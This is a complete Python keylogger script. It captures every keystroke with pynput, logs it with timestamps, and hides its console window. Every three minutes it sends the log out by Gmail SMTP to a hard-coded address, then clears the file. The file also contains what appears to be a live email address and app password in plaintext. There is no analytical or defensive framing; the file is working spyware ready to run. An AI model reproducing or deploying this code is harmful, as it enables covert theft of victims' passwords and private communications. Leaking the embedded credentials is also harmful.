from pynput.keyboard import Listener, Key
import os
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import schedule
import threading
import time

log_file = "keylog.txt"
email_interval = 3

EMAIL_ADDRESS = "b18587695@gmail.com"
EMAIL_PASSWORD = "yajiunnsgxypwbvt"
TO_EMAIL = "b18587695@gmail.com"

sentence_buffer = ""

def write_log(text):
    with open(log_file, "a") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        f.write(timestamp + text.strip() + "\n")

def flush_buffer():
    global sentence_buffer
    if sentence_buffer.strip():
        write_log(sentence_buffer)
        sentence_buffer = ""

def on_press(key):
    global sentence_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer += key.char
            if key.char in [".", "!", "?"]:
                flush_buffer()
        else:
            if key == Key.space:
                sentence_buffer += " "
            elif key == Key.enter:
                flush_buffer()
                write_log("[ENTER]")
            elif key == Key.tab:
                sentence_buffer += "    "
            elif key == Key.backspace:
                sentence_buffer = sentence_buffer[:-1]
    except Exception:
        pass

def hide_window():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def send_email():
    try:
        with open(log_file, "r") as f:
            content = f.read()
        if content.strip() == "":
            return
        msg = MIMEText(content)
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = TO_EMAIL

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        open(log_file, "w").close()
    except:
        pass

def schedule_email():
    schedule.every(email_interval).minutes.do(send_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

hide_window()
threading.Thread(target=schedule_email, daemon=True).start()

with Listener(on_press=on_press) as listener:
    listener.join()
